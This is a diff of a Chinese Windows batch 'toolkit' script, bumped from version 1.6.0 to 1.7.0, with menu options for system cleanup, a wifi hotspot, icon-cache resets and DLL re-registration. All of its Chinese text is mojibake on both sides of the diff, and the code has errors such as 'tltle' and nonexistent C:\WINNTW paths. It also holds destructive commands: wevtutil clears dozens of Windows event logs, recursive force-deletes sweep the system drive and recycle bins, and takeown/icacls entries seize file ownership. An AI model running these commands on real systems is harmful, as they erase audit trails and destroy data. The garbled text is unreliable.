@@ -7,33 +7,33 @@ MODE con: COLS=75 LINES=25
 cls
 
 Setlocal enabledelayedexpansion
-title Åú´¦Àí¹¤¾ß°ü  !date:~5,2!ÔÂ!date:~8,2!ÈÕ !time:~0,2!Ê±!time:~3,2!·Ö!time:~6,2!Ãë
+title æ‰¹å¤„ç†å·¥å…·åŒ…  !date:~5,2!æœˆ!date:~8,2!æ—¥ !time:~0,2!æ—¶!time:~3,2!åˆ†!time:~6,2!ç§’
 
 echo.
-echo.                     Åú´¦Àí¹¤¾ß°ü  1.6.0        
+echo.                     æ‰¹å¤„ç†å·¥å…·åŒ…  1.7.0        
 echo.===============================================================
-echo.   1  ÇåÀíÏµÍ³                        19 ²ì¿´ÏµÍ³ĞÅÏ¢
-echo.   2  ½¨Á¢wifiÈÈµã                    20 CÅÌ·À¶¾
-echo.   3  È¥³ı¿ì½İ·½Ê½Ğ¡¼ıÍ·              21 ²ì¿´ÓÃ»§ÁĞ±í
-echo.   4  »Ö¸´¿ì½İ·½Ê½Ğ¡¼ıÍ·              22 ÏÔÊ¾¸÷·ÖÇøÊ£Óà¿Õ¼äÇé¿ö
-echo.   5  Çå¿ÕµçÄÔÈÕÖ¾                    23 winÃÜÂëĞŞ¸Ä
-echo.   6  Çå³ıÍ¼±ê»º´æ                    24 ÎÄ¼ş¹éÀàÕûÀí
-echo.   7  ÖØĞÂ×¢²áIEÏà¹ØÈ«²¿Á´½Ó¿âÎÄ¼ş    25 ÎÄ¼şÇ¿ÖÆÉ¾³ı
-echo.   8  ×¢²áÏµÍ³ËùÓĞDLL                 26 Ìí¼Ó¸÷ÀàÓÒ¼ü²Ëµ¥
-echo.   9  flash¿Ø¼şÎŞ·¨×¢²á               27 ÖØÖÃÍøÂç
-echo.   10 Ìí¼ÓÓÒ¼ü»ñÈ¡¹ÜÀíÔ±È¨ÏŞ          28 Òş²ØÎÄ¼şµ½jpg
-echo.   11 »Ö¸´Ğ¡À®°ÈÍ¼±ê¶ªÊ§
-echo.   12 È¥³ıÍ¼±êµÄ¶ÜÅÆ
-echo.   13 ÏÔÊ¾×Ô¼ºµÄIP 
-echo.   14 Çå³ı¶àÓàµÄÓÒ¼ü²Ëµ¥Ñ¡Ïî
-echo.   15 Çå³ı¶àÓàµÄÆô¶¯ÏîÄ¿ 
-echo.   16 É¾³ıÄ¬ÈÏ¹²Ïí
-echo.   17 Ä¾Âí¶Ë¿Ú·âÉ±
-echo.   18 ¶¨Ê±¹Ø»ú                      
-echo.                                     255 ÌØÊâÇøÓò
-echo.                   A:about(¹ØÓÚ)    E:exit(ÍË³ö)               
+echo.   1  æ¸…ç†ç³»ç»Ÿ                        19 å¯Ÿçœ‹ç³»ç»Ÿä¿¡æ¯
+echo.   2  å»ºç«‹wifiçƒ­ç‚¹                    20 Cç›˜é˜²æ¯’
+echo.   3  å»é™¤å¿«æ·æ–¹å¼å°ç®­å¤´              21 å¯Ÿçœ‹ç”¨æˆ·åˆ—è¡¨
+echo.   4  æ¢å¤å¿«æ·æ–¹å¼å°ç®­å¤´              22 æ˜¾ç¤ºå„åˆ†åŒºå‰©ä½™ç©ºé—´æƒ…å†µ
+echo.   5  æ¸…ç©ºç”µè„‘æ—¥å¿—                    23 winå¯†ç ä¿®æ”¹
+echo.   6  æ¸…é™¤å›¾æ ‡ç¼“å­˜                    24 æ–‡ä»¶å½’ç±»æ•´ç†
+echo.   7  é‡æ–°æ³¨å†ŒIEç›¸å…³å…¨éƒ¨é“¾æ¥åº“æ–‡ä»¶    25 æ–‡ä»¶å¼ºåˆ¶åˆ é™¤
+echo.   8  æ³¨å†Œç³»ç»Ÿæ‰€æœ‰DLL                 26 æ·»åŠ å„ç±»å³é”®èœå•
+echo.   9  flashæ§ä»¶æ— æ³•æ³¨å†Œ               27 é‡ç½®ç½‘ç»œ
+echo.   10 æ·»åŠ å³é”®è·å–ç®¡ç†å‘˜æƒé™          28 éšè—æ–‡ä»¶åˆ°jpg
+echo.   11 æ¢å¤å°å–‡å­å›¾æ ‡ä¸¢å¤±
+echo.   12 å»é™¤å›¾æ ‡çš„ç›¾ç‰Œ
+echo.   13 æ˜¾ç¤ºè‡ªå·±çš„IP 
+echo.   14 æ¸…é™¤å¤šä½™çš„å³é”®èœå•é€‰é¡¹
+echo.   15 æ¸…é™¤å¤šä½™çš„å¯åŠ¨é¡¹ç›® 
+echo.   16 åˆ é™¤é»˜è®¤å…±äº«
+echo.   17 æœ¨é©¬ç«¯å£å°æ€
+echo.   18 å®šæ—¶å…³æœº                      
+echo.                                     255 ç‰¹æ®ŠåŒºåŸŸ
+echo.                   A:about(å…³äº)    E:exit(é€€å‡º)               
 echo.===============================================================
-echo.ÇëÑ¡Ôñ¶ÔÓ¦µÄÏîÄ¿ °´enter¼üÈ·¶¨:
+echo.è¯·é€‰æ‹©å¯¹åº”çš„é¡¹ç›® æŒ‰enteré”®ç¡®å®š:
 set /p choice=
 
 
@@ -70,15 +70,15 @@ if /i "%choice%"=="255" goto mark255
 if /i "%choice%"=="E" goto markE
 if /i "%choice%"=="A" goto markA
 
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 :Permission_Test
 
-Title È¨ÏŞÈ·ÈÏ!!
-del /f /q %SystemRoot%\System32\È¨ÏŞ²âÊÔ.dat >nul 2>nul
-if exist %SystemRoot%\System32\È¨ÏŞ²âÊÔ.dat (
+Title æƒé™ç¡®è®¤!!
+del /f /q %SystemRoot%\System32\æƒé™æµ‹è¯•.dat >nul 2>nul
+if exist %SystemRoot%\System32\æƒé™æµ‹è¯•.dat (
     cls
-    echo.ß÷ß÷ß÷ß÷ß÷ß÷ß÷ß÷~
-    echo.ß÷ß÷ß÷ß÷ß÷ß÷ß÷ß÷ß÷ß÷~
+    echo.å–µå–µå–µå–µå–µå–µå–µå–µ~
+    echo.å–µå–µå–µå–µå–µå–µå–µå–µå–µå–µ~
     pause>nul
     exit
 )
@@ -86,23 +86,23 @@ cls
 echo;
 echo;
 echo;
-echo                ÕıÔÚ²âÊÔËùĞèµÄÈ¨ÏŞ
+echo                æ­£åœ¨æµ‹è¯•æ‰€éœ€çš„æƒé™
 echo;
-echo                   ...ÇëÉÔºó...
-echo;>%SystemRoot%\System32\È¨ÏŞ²âÊÔ.dat
-if not exist %SystemRoot%\System32\È¨ÏŞ²âÊÔ.dat (
+echo                   ...è¯·ç¨å...
+echo;>%SystemRoot%\System32\æƒé™æµ‹è¯•.dat
+if not exist %SystemRoot%\System32\æƒé™æµ‹è¯•.dat (
 cls
 mode con cols=40 lines=6
 color fc 
-    echo.             È¨ÏŞÒì³£ß÷~
-    echo.	  ²¿·Ö¹¦ÄÜĞèÒªÈ¨ÏŞß÷~
-    echo.       ×îºÃÒÔ¹ÜÀíÔ±È¨ÏŞÔËĞĞß÷~
-    echo.Ò²¿ÉÒÔ°ÑÕâ¶ÎĞèÒªÈ¨ÏŞÈÏÖ¤µÄ´úÂëÉ¾µôß÷~
-    echo.             ÈÎÒâ¼üÍË³öß÷~
+    echo.             æƒé™å¼‚å¸¸å–µ~
+    echo.	  éƒ¨åˆ†åŠŸèƒ½éœ€è¦æƒé™å–µ~
+    echo.       æœ€å¥½ä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œå–µ~
+    echo.ä¹Ÿå¯ä»¥æŠŠè¿™æ®µéœ€è¦æƒé™è®¤è¯çš„ä»£ç åˆ æ‰å–µ~
+    echo.             ä»»æ„é”®é€€å‡ºå–µ~
     pause>nul
     exit
 )
-del /f /q %SystemRoot%\System32\È¨ÏŞ²âÊÔ.dat >nul 2>nul
+del /f /q %SystemRoot%\System32\æƒé™æµ‹è¯•.dat >nul 2>nul
 
 (
 if /i "%choice%"=="3" goto mark3
@@ -115,28 +115,28 @@ if /i "%choice%"=="26" goto mark26
 if /i "%choice%"=="27" goto mark27
 )
 
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 :markA
 
 cls
-@echo off&setlocal enabledelayedexpansion&title about(¹ØÓÚ)
+@echo off&setlocal enabledelayedexpansion&title about(å…³äº)
 mode con cols=34 lines=9
-set a=¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
-set b=¡ï
+set a=â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
+set b=â˜…
 set c=
 set d=
 set e=123456789abcde
 echo/
 echo **********(A-B-O-U-T)***********
 echo.
-echo. ²¿·ÖÑ¡ÏîĞèÒª¹ÜÀíÔ±Éí·İÔËĞĞß÷~
-echo. ½öÔÚwin7ÉÏ²âÊÔ¹ıµÄ±¾Ğ¡³ÌĞòß÷~
-echo. ÒÔÉÏËùÓĞ×ÊÁÏÈ«²¿À´×Ô»¥ÁªÍøß÷~
-echo. ²¢²»ÊÇ±¾ß÷Ô­´´µÄß÷~		
-echo. ÈçÓĞÎÊÌâ¿É@°Ù¶ÈID"¶¬Ñ©´ºÃÎ"ß÷~
+echo. éƒ¨åˆ†é€‰é¡¹éœ€è¦ç®¡ç†å‘˜èº«ä»½è¿è¡Œå–µ~
+echo. ä»…åœ¨win7ä¸Šæµ‹è¯•è¿‡çš„æœ¬å°ç¨‹åºå–µ~
+echo. ä»¥ä¸Šæ‰€æœ‰èµ„æ–™å…¨éƒ¨æ¥è‡ªäº’è”ç½‘å–µ~
+echo. å¹¶ä¸æ˜¯æœ¬å–µåŸåˆ›çš„å–µ~		
+echo. å¦‚æœ‰é—®é¢˜å¯@ç™¾åº¦ID"å†¬é›ªæ˜¥æ¢¦"å–µ~
 echo.
 
-@echo msgbox "About:¶¬Ñ©½´×Ï×÷ß÷">msg.vbs 
+@echo msgbox "About:å†¬é›ªé…±ç´«ä½œå–µ">msg.vbs 
 @msg.vbs
 @del msg.vbs
 
@@ -160,29 +160,29 @@ exit
 
 :mark1
 cls
-tltle ÇåÀíÏµÍ³
+tltle æ¸…ç†ç³»ç»Ÿ
 @echo off
 
 @echo off 
 color 0b
 echo ==================================================================
 echo.
-echo ÄúÒÑÆô¶¯ WIN 7 ÏµÍ³À¬»øÇåÀí £¬ÕâÀïÔËĞĞµÄÃüÁî¶¼ºÜ°²È«£¡
+echo æ‚¨å·²å¯åŠ¨ WIN 7 ç³»ç»Ÿåƒåœ¾æ¸…ç† ï¼Œè¿™é‡Œè¿è¡Œçš„å‘½ä»¤éƒ½å¾ˆå®‰å…¨ï¼
 echo.
 echo ==================================================================
 echo.
-echo ÔÚ³ÌĞòÃ»ÓĞ½áÊøµÄĞÅÏ¢Ê±£¬ÇëÎğ¹Ø±Õ±¾´°¿Ú£¡
+echo åœ¨ç¨‹åºæ²¡æœ‰ç»“æŸçš„ä¿¡æ¯æ—¶ï¼Œè¯·å‹¿å…³é—­æœ¬çª—å£ï¼
 echo.
 echo ==================================================================
 echo.
-echo ÕıÔÚÇå³ıÏµÍ³À¬»øÎÄ¼ş£¬ÇëÉÔºó...... 
+echo æ­£åœ¨æ¸…é™¤ç³»ç»Ÿåƒåœ¾æ–‡ä»¶ï¼Œè¯·ç¨å...... 
 echo.
 echo ==================================================================
 echo.
 echo **********************************
 echo.
-echo µÚ Ò»
-echo É¾³ıÁÙÊ±ÎÄ¼ş
+echo ç¬¬ ä¸€
+echo åˆ é™¤ä¸´æ—¶æ–‡ä»¶
 echo.
 echo **********************************
 echo.
@@ -194,12 +194,12 @@ del /f /s /q %windir%\prefetch\*.*
 echo.
 echo **********************************
 echo.
-echo µÚ ¶ş
-echo É¾³ıÈÕÖ¾ÎÄ¼ş
-echo É¾³ı°ïÖúË÷ÒıÎÄ¼ş
-echo É¾³ı´ÅÅÌÉ¨ÃèÁôÏÂµÄÁÙÊ±ÎÄ¼ş
-echo É¾³ı±¸·İÎÄ¼ş
-echo É¾³ı¾É±¸·İÎÄ¼ş
+echo ç¬¬ äºŒ
+echo åˆ é™¤æ—¥å¿—æ–‡ä»¶
+echo åˆ é™¤å¸®åŠ©ç´¢å¼•æ–‡ä»¶
+echo åˆ é™¤ç£ç›˜æ‰«æç•™ä¸‹çš„ä¸´æ—¶æ–‡ä»¶
+echo åˆ é™¤å¤‡ä»½æ–‡ä»¶
+echo åˆ é™¤æ—§å¤‡ä»½æ–‡ä»¶
 echo.
 echo **********************************
 echo.
@@ -211,8 +211,8 @@ del /f /s /q %systemdrive%\*.old
 echo.
 echo **********************************
 echo.
-echo µÚ Èı
-echo Çå¿Õ»ØÊÕÕ¾
+echo ç¬¬ ä¸‰
+echo æ¸…ç©ºå›æ”¶ç«™
 echo.
 echo **********************************
 echo.
@@ -224,8 +224,8 @@ del /f /s /q g:\$recycle.bin\*.*
 echo.
 echo **********************************
 echo.
-echo µÚ ËÄ
-echo É¾³ı×Ô¶¯¸üĞÂºóÁôÏÂµÄÈí¼ş
+echo ç¬¬ å››
+echo åˆ é™¤è‡ªåŠ¨æ›´æ–°åç•™ä¸‹çš„è½¯ä»¶
 
 echo.
 echo **********************************
@@ -234,17 +234,17 @@ rd /s /q %windir%\SoftwareDistribution\Download & md %windir%\SoftwareDistributi
 echo.
 echo **********************************
 echo.
-echo µÚ Îå
-echo É¾³ıÉÏÍø²úÉúµÄCookies
+echo ç¬¬ äº”
+echo åˆ é™¤ä¸Šç½‘äº§ç”Ÿçš„Cookies
 echo.
 echo **********************************
 echo.
-del /f /q ¡°%userprofile%\AppData\Roaming\Microsoft\Windows\Cookies\*.*¡±
+del /f /q â€œ%userprofile%\AppData\Roaming\Microsoft\Windows\Cookies\*.*â€
 echo.
 echo **********************************
 echo.
-echo µÚ Áù
-echo É¾³ıÉÏÍø²úÉúµÄÁÙÊ±ÎÄ¼ş
+echo ç¬¬ å…­
+echo åˆ é™¤ä¸Šç½‘äº§ç”Ÿçš„ä¸´æ—¶æ–‡ä»¶
 echo.
 echo **********************************
 echo.
@@ -252,47 +252,47 @@ del /f /s /q "%userprofile%\AppData\Local\Microsoft\Windows\Temporary Internet F
 echo.
 echo **********************************
 echo.
-echo µÚ Æß
-echo ÔËĞĞË½Òş±£»¤
+echo ç¬¬ ä¸ƒ
+echo è¿è¡Œç§éšä¿æŠ¤
 echo.
 echo **********************************
 echo.
 del /f /s /q "%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*" 
 
-echo Çå³ıÏµÍ³À¬»øÍê³É£¡Çë°´ÈÎÒâ¼ü·µ»ØÉÏÒ»²ã¡­¡­
+echo æ¸…é™¤ç³»ç»Ÿåƒåœ¾å®Œæˆï¼è¯·æŒ‰ä»»æ„é”®è¿”å›ä¸Šä¸€å±‚â€¦â€¦
 pause >nul
 goto mark0
 
 
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 :mark2
 cls
-title wifiÖúÊÖ
+title wifiåŠ©æ‰‹
 @echo off
 
-echo    1.½¨Á¢wifi
-echo    2.´ò¿ªwifi
-echo    3.ÏÔÊ¾Á¬½Ó¿Í»§¶Ë
-echo    4.¹Ø±Õwifi
-echo    5.ÍË³ö³ÌĞò£¨ÍË³ö³ÌĞò½«²»»áÓ°ÏìwifiÊ¹ÓÃ£©
-echo    6.·µ»ØÉÏÒ»²ã
-set /p k= ÇëÑ¡Ôñ¶ÔÓ¦µÄÏîÄ¿ °´enter¼üÈ·¶¨:
+echo    1.å»ºç«‹wifi
+echo    2.æ‰“å¼€wifi
+echo    3.æ˜¾ç¤ºè¿æ¥å®¢æˆ·ç«¯
+echo    4.å…³é—­wifi
+echo    5.é€€å‡ºç¨‹åºï¼ˆé€€å‡ºç¨‹åºå°†ä¸ä¼šå½±å“wifiä½¿ç”¨ï¼‰
+echo    6.è¿”å›ä¸Šä¸€å±‚
+set /p k= è¯·é€‰æ‹©å¯¹åº”çš„é¡¹ç›® æŒ‰enteré”®ç¡®å®š:
 if /i %k%==1 goto mark2.1
 if /i %k%==2 goto mark2.2
 if /i %k%==3 goto mark2.3
 if /i %k%==4 goto mark2.4
 if /i %k%==5 goto mark2.5
 if /i %k%==6 goto mark0
-echo ÄãµÄÊäÈëÓĞÎó£¬°´ÈÎÒâ¼ü·µ»ØÖ÷³ÌĞò
+echo ä½ çš„è¾“å…¥æœ‰è¯¯ï¼ŒæŒ‰ä»»æ„é”®è¿”å›ä¸»ç¨‹åº
 pause >nul
 cls
 goto mark2
 
 :mark2.1
 cls
-set /p name=ÇëÊäÈëÕËºÅ£º
+set /p name=è¯·è¾“å…¥è´¦å·ï¼š
 cls
-set /p secrect=ÇëÊäÈëÃÜÂë£¨8µ½16¸ö×Ö·û£©£º
+set /p secrect=è¯·è¾“å…¥å¯†ç ï¼ˆ8åˆ°16ä¸ªå­—ç¬¦ï¼‰ï¼š
 netsh wlan set hostednetwork mode=allow ssid=%name% key=%secrect%
 echo.
 pause >nul
@@ -302,7 +302,7 @@ goto mark2
 :mark2.2
 netsh wlan start hostednetwork
 cls
-echo ¿ÉÒÔÊ¹ÓÃwifiÁË
+echo å¯ä»¥ä½¿ç”¨wifiäº†
 echo.
 pause >nul
 cls
@@ -318,7 +318,7 @@ goto mark2
 :mark2.4
 netsh wlan stop hostednetwork
 cls
-echo ÒÑ¹Ø±Õwifi£¡
+echo å·²å…³é—­wifiï¼
 pause >nul
 cls
 goto mark2.4
@@ -332,45 +332,45 @@ echo
 ping /n 3 127.1>nul
 exit
 pause >nul
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 :mark3
 cls
-title È¥³ı¿ì½İ·½Ê½Ğ¡¼ıÍ·
+title å»é™¤å¿«æ·æ–¹å¼å°ç®­å¤´
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 29 /d "%systemroot%\system32\imageres.dll,196" /t reg_sz /f
 taskkill /f /im explorer.exe
 attrib -s -r -h "%userprofile%\AppData\Local\iconcache.db"
 del "%userprofile%\AppData\Local\iconcache.db" /f /q
 start explorer
 
-echo. È¥³ı¿ì½İ·½Ê½Ğ¡¼ıÍ·Íê³É£¡
-echo. Çë°´ÈÎÒâ¼ü·µ»ØÉÏÒ»²ã¡­¡­
+echo. å»é™¤å¿«æ·æ–¹å¼å°ç®­å¤´å®Œæˆï¼
+echo. è¯·æŒ‰ä»»æ„é”®è¿”å›ä¸Šä¸€å±‚â€¦â€¦
 pause >nul
 goto mark0
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 :mark4
 cls
-title »Ö¸´¿ì½İ·½Ê½Ğ¡¼ıÍ·
+title æ¢å¤å¿«æ·æ–¹å¼å°ç®­å¤´
 reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 29 /f
 taskkill /f /im explorer.exe
 attrib -s -r -h "%userprofile%\AppData\Local\iconcache.db"
 del "%userprofile%\AppData\Local\iconcache.db" /f /q
 start explorer
 
-echo. »Ö¸´¿ì½İ·½Ê½Ğ¡¼ıÍ·Íê³É£¡
-echo. Çë°´ÈÎÒâ¼ü·µ»ØÉÏÒ»²ã¡­¡­
+echo. æ¢å¤å¿«æ·æ–¹å¼å°ç®­å¤´å®Œæˆï¼
+echo. è¯·æŒ‰ä»»æ„é”®è¿”å›ä¸Šä¸€å±‚â€¦â€¦
 pause >nul
 goto mark0
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 
 :mark5
 cls
-echo. ¿ªÊ¼Çå¿ÕµçÄÔÈÕÖ¾£¡
-title Çå¿ÕµçÄÔÈÕÖ¾
+echo. å¼€å§‹æ¸…ç©ºç”µè„‘æ—¥å¿—ï¼
+title æ¸…ç©ºç”µè„‘æ—¥å¿—
 wevtutil.exe cl "ACEEventLog"
 wevtutil.exe cl "Application"
 wevtutil.exe cl "HardwareEvents"
@@ -506,11 +506,11 @@ wevtutil.exe cl "System"
 wevtutil.exe cl "Windows PowerShell"
 
 
-echo. Çå¿ÕµçÄÔÈÕÖ¾Íê³É£¡
-echo. Çë°´ÈÎÒâ¼ü·µ»ØÉÏÒ»²ã¡­¡­
+echo. æ¸…ç©ºç”µè„‘æ—¥å¿—å®Œæˆï¼
+echo. è¯·æŒ‰ä»»æ„é”®è¿”å›ä¸Šä¸€å±‚â€¦â€¦
 pause >nul
 goto mark0
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 
@@ -518,11 +518,11 @@ exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
 
 :mark6
 cls
-title Çå³ıÍ¼±ê»º´æ
-echo.   ¿ªÊ¼Çå³ıÍ¼±ê»º´æ
+title æ¸…é™¤å›¾æ ‡ç¼“å­˜
+echo.   å¼€å§‹æ¸…é™¤å›¾æ ‡ç¼“å­˜
 taskkill /f /im explorer.exe
 
-rem ÇåÀíÏµÍ³Í¼±ê»º´æÊı¾İ¿â
+rem æ¸…ç†ç³»ç»Ÿå›¾æ ‡ç¼“å­˜æ•°æ®åº“
 
 attrib -h -s -r "%userprofile%\AppData\Local\IconCache.db"
 
@@ -538,21 +538,21 @@ del /f "%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_1024.d
 del /f "%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_idx.db"
 del /f "%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_sr.db"
 
-rem ÇåÀí ÏµÍ³ÍĞÅÌ¼ÇÒäµÄÍ¼±ê
+rem æ¸…ç† ç³»ç»Ÿæ‰˜ç›˜è®°å¿†çš„å›¾æ ‡
 
 echo y|reg delete "HKEY_CLASSES_ROOT\Local Settings\Software\Microsoft\Windows\CurrentVersion\TrayNotify" /v IconStreams
 echo y|reg delete "HKEY_CLASSES_ROOT\Local Settings\Software\Microsoft\Windows\CurrentVersion\TrayNotify" /v PastIconsStream
 
-rem ÖØÆôWindowsÍâ¿Ç³ÌĞòexplorer
+rem é‡å¯Windowså¤–å£³ç¨‹åºexplorer
 
 start explorer
 
 
-echo. Çå³ıÍ¼±ê»º´æÍê³É
-echo. Çë°´ÈÎÒâ¼ü·µ»ØÉÏÒ»²ã¡­¡­
+echo. æ¸…é™¤å›¾æ ‡ç¼“å­˜å®Œæˆ
+echo. è¯·æŒ‰ä»»æ„é”®è¿”å›ä¸Šä¸€å±‚â€¦â€¦
 pause >nul
 goto mark0
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 
@@ -565,8 +565,8 @@ exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
 
 :mark7
 cls
-title ÖØĞÂ×¢²áIEÏà¹ØÈ«²¿Á´½Ó¿âÎÄ¼ş
-echo.   ¿ªÊ¼ÖØĞÂ×¢²áIEÏà¹ØÈ«²¿Á´½Ó¿âÎÄ¼ş
+title é‡æ–°æ³¨å†ŒIEç›¸å…³å…¨éƒ¨é“¾æ¥åº“æ–‡ä»¶
+echo.   å¼€å§‹é‡æ–°æ³¨å†ŒIEç›¸å…³å…¨éƒ¨é“¾æ¥åº“æ–‡ä»¶
 rundll32.exe advpack.dll /DelNodeRunDll32 C:\WINNTW\System32\dacui.dll
 
 rundll32.exe advpack.dll /DelNodeRunDll32 C:\WINNTW\Catroot\icatalog.mdb 
@@ -667,11 +667,11 @@ regsvr32 scrrun.dll mstinit.exe /setup /s
 regsvr32 msnsspc.dll /SspcCreateSspiReg /s
 regsvr32 msapsspc.dll /SspcCreateSspiReg /s
 
-echo. ÖØĞÂ×¢²áIEÏà¹ØÈ«²¿Á´½Ó¿âÎÄ¼şÍê³É
-echo. Çë°´ÈÎÒâ¼ü·µ»ØÉÏÒ»²ã¡­¡­
+echo. é‡æ–°æ³¨å†ŒIEç›¸å…³å…¨éƒ¨é“¾æ¥åº“æ–‡ä»¶å®Œæˆ
+echo. è¯·æŒ‰ä»»æ„é”®è¿”å›ä¸Šä¸€å±‚â€¦â€¦
 pause >nul
 goto mark0
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 
@@ -685,14 +685,14 @@ exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
 
 :mark8
 cls
-title ×¢²áÏµÍ³ËùÓĞDLL
-for /f %%i in ('dir /a /b %windir%\system32\*.dll') do echo ÕıÔÚ×¢²á%%i,ÇëÉÔºò... & regsvr32 /s "%windir%\system32\%%i" & cls
+title æ³¨å†Œç³»ç»Ÿæ‰€æœ‰DLL
+for /f %%i in ('dir /a /b %windir%\system32\*.dll') do echo æ­£åœ¨æ³¨å†Œ%%i,è¯·ç¨å€™... & regsvr32 /s "%windir%\system32\%%i" & cls
 
-echo. ÖØĞÂ×¢²áÏµÍ³ËùÓĞDLL
-echo. Çë°´ÈÎÒâ¼ü·µ»ØÉÏÒ»²ã¡­¡­
+echo. é‡æ–°æ³¨å†Œç³»ç»Ÿæ‰€æœ‰DLL
+echo. è¯·æŒ‰ä»»æ„é”®è¿”å›ä¸Šä¸€å±‚â€¦â€¦
 pause >nul
 goto mark0
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 
@@ -701,7 +701,7 @@ exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
 
 :mark9 
 cls
-title ×¢²áflash¿Ø¼şdll
+title æ³¨å†Œflashæ§ä»¶dll
 regsvr32 Shdocvw.dll 
 regsvr32 Oleaut32.dll 
 regsvr32 Actxprxy.dll 
@@ -709,37 +709,37 @@ regsvr32 Mshtml.dll
 regsvr32 Urlmon.dll 
 regsvr32 browseui.dll
 
-echo. ÖØĞÂ×¢²áflash¿Ø¼şdll
-echo. Çë°´ÈÎÒâ¼ü·µ»ØÉÏÒ»²ã¡­¡­
+echo. é‡æ–°æ³¨å†Œflashæ§ä»¶dll
+echo. è¯·æŒ‰ä»»æ„é”®è¿”å›ä¸Šä¸€å±‚â€¦â€¦
 pause >nul
 goto mark0
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 
 
 :mark10
 cls
-title Ìí¼ÓÓÒ¼ü»ñÈ¡¹ÜÀíÔ±È¨ÏŞ
+title æ·»åŠ å³é”®è·å–ç®¡ç†å‘˜æƒé™
 
-reg add "HKCR\*\shell\runas" /f /ve /t REG_SZ /d "Ìí¼Ó¹ÜÀíÔ±È¨ÏŞ"
+reg add "HKCR\*\shell\runas" /f /ve /t REG_SZ /d "æ·»åŠ ç®¡ç†å‘˜æƒé™"
 reg add "HKCR\*\shell\runas" /f /v "NoWorkingDirectory" /t REG_SZ /d ""
 reg add "HKCR\*\shell\runas\command" /f /ve /t REG_SZ /d "cmd.exe /c takeown /f \"%%1\" && icacls \"%%1\" /grant administrators:F"
 reg add "HKCR\*\shell\runas\command" /f /v "IsolatedCommand" /t REG_SZ /d "cmd.exe /c takeown /f \"%%1\" && icacls \"%%1\" /grant administrators:F"
-reg add "HKCR\exefile\shell\runas2" /f /ve /t REG_SZ /d "Ìí¼Ó¹ÜÀíÔ±È¨ÏŞ"
+reg add "HKCR\exefile\shell\runas2" /f /ve /t REG_SZ /d "æ·»åŠ ç®¡ç†å‘˜æƒé™"
 reg add "HKCR\exefile\shell\runas2" /f /v "NoWorkingDirectory" /t REG_SZ /d ""
 reg add "HKCR\exefile\shell\runas2\command" /f /ve /t REG_SZ /d "cmd.exe /c takeown /f \"%%1\" && icacls \"%%1\" /grant administrators:F"
 reg add "HKCR\exefile\shell\runas2\command" /f /v "IsolatedCommand" /t REG_SZ /d "cmd.exe /c takeown /f \"%%1\" && icacls \"%%1\" /grant administrators:F"
-reg add "HKCR\Directory\shell\runas" /f /ve /t REG_SZ /d "Ìí¼Ó¹ÜÀíÔ±È¨ÏŞ"
+reg add "HKCR\Directory\shell\runas" /f /ve /t REG_SZ /d "æ·»åŠ ç®¡ç†å‘˜æƒé™"
 reg add "HKCR\Directory\shell\runas" /f /v "NoWorkingDirectory" /t REG_SZ /d ""
 reg add "HKCR\Directory\shell\runas\command" /f /ve /t REG_SZ /d "cmd.exe /c takeown /f \"%%1\" /r /d y && icacls \"%%1\" /grant administrators:F /t"
 reg add "HKCR\Directory\shell\runas\command" /f /v "IsolatedCommand" /t REG_SZ /d "cmd.exe /c takeown /f \"%%1\" /r /d y && icacls \"%%1\" /grant administrators:F /t"
 
-echo. Ìí¼ÓÓÒ¼ü»ñÈ¡¹ÜÀíÔ±È¨ÏŞÍê³É
-echo. Çë°´ÈÎÒâ¼ü·µ»ØÉÏÒ»²ã¡­¡­
+echo. æ·»åŠ å³é”®è·å–ç®¡ç†å‘˜æƒé™å®Œæˆ
+echo. è¯·æŒ‰ä»»æ„é”®è¿”å›ä¸Šä¸€å±‚â€¦â€¦
 pause >nul
 goto mark0
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 
